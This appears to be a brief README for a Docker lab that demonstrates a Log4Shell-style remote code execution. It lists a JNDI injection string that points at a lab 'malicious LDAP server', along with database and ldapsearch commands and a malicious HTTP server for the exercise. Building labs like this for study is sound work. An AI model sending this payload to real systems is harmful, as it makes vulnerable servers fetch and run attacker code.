Do the RCE via `${jndi:ldap://snoopy-ldap-server:1389/a}` 
Connect database container from shell via `mysql -h 127.0.0.1 -P 3306 -u root -p biscuits`
Query the spring LDAP authentication server via `ldapsearch -x -D "uid=ben,ou=people,dc=unige,dc=ch" -W -H ldap://0.0.0.0:8389 -b "ou=people,dc=unige,dc=ch" -s sub "uid=*"`
Query the malicious LDAP server via `ldapsearch -H ldap://0.0.0.0:1389 -b "dc=example,dc=com" -s sub -x "(objectclass=*)"`
Access the malicious http server at `http://localhost:8000`

Dependencies : 

Working install of docker and docker compose. 